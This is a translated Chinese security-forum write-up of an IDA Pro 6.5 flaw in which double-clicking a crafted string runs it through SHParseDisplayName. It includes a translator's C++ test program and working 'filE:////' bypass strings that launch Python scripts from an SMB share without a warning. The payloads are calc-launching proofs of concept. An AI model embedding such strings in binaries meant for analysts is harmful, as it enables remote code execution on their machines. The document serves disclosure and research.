
# [翻译]IDA v6.5 文本执行

**更新：**有些人不喜欢产生执行警告的提示。在IDA中使用语法高亮来表示这部分内容被选中，然后可以进行复制和粘贴操作，同时由于IDA中用户默认安装了python，可以使用`.py`文件绕过警告对话框并直接从SMB共享中运行。所以，对于这种没有执行警告的地方我们需要格外小心。

![](https://bbs.kanxue.com/upload/attach/201803/740325_59DDWRKHAGB9ZAQ.jpg)

在使用IDA 6.5时，我注意它对于一些字符串的处理方式显得很奇怪。在某些情况下，它实际上会遵守协议处理程序。比方说一串简单的字符串。

```
blah ba7K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3N6G2L8$3N6D9k6g2)9J5k6h3y4G2L8b7`.`.
```

![](https://bbs.kanxue.com/upload/attach/201803/740325_WBGTNADB8FDQHCH.jpg)

当在反汇编程序中查看时，如果在IDA视图中双击（用于字符串高亮显示），将启动默认浏览器访问google.com。`blah`对于整个字符串而言，它可以保证字符串被IDA视为一个协议化的命令。（我调试IDA找到这个协议处理程序正在处理的位置，我认为它是[`MkParseDisplayName`](https://bbs.kanxue.com/elink@6d2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0M7$3c8F1i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8X3I4A6j5Y4u0S2M7Y4W2Q4x3V1k6%4K9h3&6V1L8%4N6K6i4K6u0r3k6r3g2K6K9%4c8G2M7q4)9J5c8X3#2K6y4U0V1I4x3U0f1K6i4K6t1#2x3U0m8Q4x3U0S2Q4x3U0f1J5x3s2k6Q4x3@1c8Q4x3U0f1J5x3s2k6K6i4K6u0W2z5o6g2Q4x3U0f1J5x3q4)9J5z5g2)9J5y4e0t1H3i4K6u0W2j5i4y4H3P5l9`.`.)或类似的东西。

实际调试了一下，我发现这是由[`SHParseDisplayName`](https://bbs.kanxue.com/elink@d1cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0M7$3c8F1i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8X3I4A6j5Y4u0S2M7Y4W2Q4x3V1k6%4K9h3&6V1L8%4N6K6i4K6u0r3k6r3g2K6K9%4c8G2M7q4)9J5c8X3u0T1y4K6j5J5x3U0x3$3i4K6t1#2x3U0m8Q4x3U0S2Q4x3U0f1J5x3s2k6Q4x3@1c8Q4x3U0f1J5x3s2k6K6i4K6u0W2z5o6g2Q4x3U0f1J5x3q4)9J5z5g2)9J5y4e0t1H3i4K6u0W2j5i4y4H3P5l9`.`.) 处理的。我想这应该很简单，可以直接用下面的协议模板来执行代码：

```
blah htafile:baddomain.com/bad.hta
```

看来这个协议被忽略了（相比于其他几个常见的协议）。我确实注意到`file:`协议起作用了，虽然`file:///`在被传递给`SHParseDisplayName`之前会被剥离掉，这使得我的字符串

```
blah file:///test.com/poc.exe
```

变成

```
/test.com/poc.exe
```

我们构造的类似于URI一样的链接在传递给`SHParseDisplayName`之前，我们没有办法指导Windows如何处理这个字符串（作为协议命令），这称为困扰我的一个问题。我也尝试了其他一些技巧，但没有办法解决这个问题，它总会留下了一个前缀“/”字符。即使在尝试`file:/// file:///test.com/poc.exe`时，我也只是得到`/file:///test.com/poc.exe`，当然这是一个无效的协议。

![](https://bbs.kanxue.com/upload/attach/201803/740325_YFUZWYA7RR9ADS5.jpg)

从最终的结果来看，当我们使用`filE:////`进行绕过，这个方法确实有效地绕过了过滤器，在开始时我甚至没有尝试，因为我一直认为它不会工作。我们看到它作为`SHParseDisplayName`的字符串参数，确实得到执行。

现在当双击字符串时，这将被解释为执行（取决于文件扩展名），这意味着远程代码执行可能发生 ：

![](https://bbs.kanxue.com/upload/attach/201803/740325_RP7PG7EG6CKJV7K.jpg)

文章原文的翻译至此结束。下面便是译者对于其中一些疑惑点进行验证

为了验证作者的实验，我特地从吾爱破解下载了IDA v6.5版本，然后放到win7虚拟机中，然后编写了一个C++程序作为测试程序，代码如下：

```
#include <iostream>



using namespace std;



int main()

{

	cout << "blah https:\/\/bbs.pediy.com\/                  ";//成功



	cout << "aaa https:\/\/bbs.pediy.com\/                   ";//成功



	cout << "    https:\/\/bbs.pediy.com\/                   ";//成功



	cout << "https:\/\/bbs.pediy.com\/                     ";//失败



	cout << "aa file:\/\/192.168.1.131\/share\/bad.py                     ";//失败

	cout << "aa file:\/\/192.168.1.131\/share\/bad.pyw                     ";//失败



	cout << "aa file:\/\/\/192.168.1.131\/share\/bad.py                     ";//失败

	cout << "aa file:\/\/\/192.168.1.131\/share\/bad.pyw                     ";//失败



	cout << "aa file:\/\/\/file:\/\/\/192.168.1.131\/share\/bad.py                     ";//失败

	cout << "aa file:\/\/\/file:\/\/\/192.168.1.131\/share\/bad.pyw                     ";//失败



	cout << "aa file:\/\/\/\/192.168.1.131\/share\/bad.py                     ";//失败

	cout << "aa file:\/\/\/\/192.168.1.131\/share\/bad.pyw                     ";//失败



	cout << "aa filE:\/\/\/\/192.168.1.131\/share\/bad.py                     ";//成功

	cout << "aa filE:\/\/\/\/192.168.1.131\/share\/bad.pyw                     ";//成功



	cout << "aa filE:\/\/\/\/\/\/192.168.1.131\/share\/bad.py                     ";//成功

	cout << "aa filE:\/\/\/\/\/\/192.168.1.131\/share\/bad.pyw                     ";//成功

	

	cout << "aa filE:\/\/\/\/\/\/192.168.1.131\/share\/testexe.exe                     ";//失败

}
```

发布release版本，放到虚拟机中，然后载入IDA中，按Shift+F12，快速找到我们想要观察的字符串，双击找到所在位置。然后在虚拟机中搭建一个SMB服务，系统是ubuntu 16.04 ，IP地址 192.168.1.131，共享目录为`/home/share`,里面放了一些测试文件.

![](https://bbs.kanxue.com/upload/attach/201803/740325_ZTPFX9VFX5XF6NJ.jpg)

```
#bad.py和bad.pyw代码相同

import os

os.system("calc")



```

```
// testexe.exe 源码

#include <stdlib.h>

int main()

{

	system("calc");

}
```

最后实验结论，在IDA V6.5版本中，双击下列文本，可以被执行

```
blah http://bbs.pediy.com
```

![](https://bbs.kanxue.com/upload/attach/201803/740325_XKGADCAHXVSGMVB.gif)

```
blah filE://////192.168.1.131/testexe.exe  //会有执行的弹窗，所以算是不可以执行
```

![](https://bbs.kanxue.com/upload/attach/201803/740325_BNDSAWCRHJ4T9U6.gif)

## 以下四种情况都可以绕过提示，直接执行python脚本

```
blah filE:////192.168.1.131/share/bad.py
blah filE:////192.168.1.131/share/bad.pyw
blah filE://////192.168.1.131/share/bad.py
blah filE://////192.168.1.131/share/bad.pyw
```

![](https://bbs.kanxue.com/upload/attach/201803/740325_UURH7ER4439XUP6.gif)

后面有时间的话会具体研究以下这里

`SHParseDisplayName`函数是如何操作链接的文本的，同时也欢迎看雪的好友一起讨论学习。

> 原文作者： RISCYbusiness
>
> 原文链接：e7dK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4u0A6M7$3y4&6i4K6u0W2j5Y4g2K6K9h3&6W2M7%4y4Q4x3V1j5J5x3o6p5^5i4K6u0r3x3o6u0Q4x3V1k6A6k6r3q4Q4x3X3c8J5k6h3#2G2N6r3g2Q4x3X3c8W2P5r3g2U0N6i4c8A6L8$3&6Q4x3V1j5`.
>
> 翻译：看雪翻译组-skeep

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于  2018-3-29 11:10 被skeep编辑 ，原因： 完成所有内容
